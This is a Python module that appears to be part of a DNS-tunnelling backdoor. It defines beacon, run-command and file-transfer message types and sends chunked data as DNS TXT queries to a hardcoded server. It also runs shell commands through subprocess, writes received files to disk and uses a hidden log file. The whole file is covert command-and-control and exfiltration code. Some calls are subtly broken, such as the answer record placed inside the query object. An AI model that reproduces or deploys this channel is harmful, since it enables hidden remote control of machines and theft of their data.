import os
from scapy.all import *
import signal
import subprocess
import threading
import base64

 
from scapy.all import *
import threading

FILE = b'filexx'           # module to send file
RUN = b'runxxx'            # module to run command
BEACON = b'beacon'          # client is ready to recieve command
BEGIN_OUTPUT = b'begino'    # server to open output_file
BEGIN_FILE = b'beginf'       # server to open file - name of the file in the data
IN_TRANSFER = b'transf'      # server to continue writing to the opened file
EF = b'eofeof'              # server to close the opened file

SERVER_ADR = "192.168.1.22"
ICMP_RESPONSE = "icmp[0]=0"
ICMP_REQUEST = "icmp[0]=8"

LOG_OUTPUT = ".log_output.txt"
MTU_SIZE = 1500
HEADER_SIZE = 100

RUN_MODEL = "run"
SEND_MODEL = "send"

def send_qery(dest_adr,data,is_output): 
    for chunk in range(0, len(data), MTU_SIZE - HEADER_SIZE):
        x = chunk
        if is_output == 1:                          # if in_transfer flag is required
            content = base64.b64encode(IN_TRANSFER)
            content+=data[x:x+1400]
            pkt = IP(dst=dest_adr)/UDP(sport="1234")/DNS(qd=DNSQR(qtype="TXT", qname=content))
        else:
            pkt = IP(dst=dest_adr)/UDP()/DNS(qd=DNSQR(qtype="TXT", qname=data))
        send(pkt)
        time.sleep(100/1000)
        
def send_response(pkt_no_dns,get_qname,data): 
        pkt = pkt_no_dns/DNS(qd=DNSQR(qtype="TXT", qname=get_qname,an=DNSRR(rdata=data)))
        send(pkt)


def sniff_pkt(pfilter,handler,cnt=30,timer=1000):
    capture = sniff(filter=pfilter,count=cnt,prn=handler,timeout=timer)
    
def signal_handler(sig, frame):
    print(' Exiting...')
    sys.exit(0)
    
    
def RunCommand(cmd):
    return subprocess.getoutput(cmd)
    # output_stream = os.popen(cmd)
    # pkt_send(dest=server_adr,data=output_stream.read())
    
    
def open_file(file_name):
	flags = os.O_WRONLY|os.O_CREAT|os.O_APPEND
	fd = os.open(file_name,flags)  
	return fd

def write_to_file(fd,to_write):
	#encoded_content = to_write.encode('utf-8')
	#os.write(fd,encoded_content)
	os.write(fd,to_write)
        
def close_file(fd):
    os.close(fd)
    
def check_prefix(my_qname):             #extract 5 first bytes from data
    if my_qname.startswith(RUN):
        return RUN
    if my_qname.startswith(FILE):
        return FILE
    if my_qname.startswith(BEACON):
        return BEACON
    if my_qname.startswith(BEGIN_OUTPUT):
        return BEGIN_OUTPUT
    if my_qname.startswith(BEGIN_FILE):
        return BEGIN_FILE
    if my_qname.startswith(IN_TRANSFER):
        return IN_TRANSFER
    if my_qname.startswith(EF):
        return EF
def extract_data(my_qname,prefix_packet):           #extract data (all the data besides the first 5 bytes)
    print("in extract data:")
    print(type(my_qname))
    size_prefix = len(prefix_packet)
    try:
        return my_qname[size_prefix:]
    except:
        return str(None)

def bin_to_str(bin_data):
    return bin_data.decode('utf-8')


    
    
    
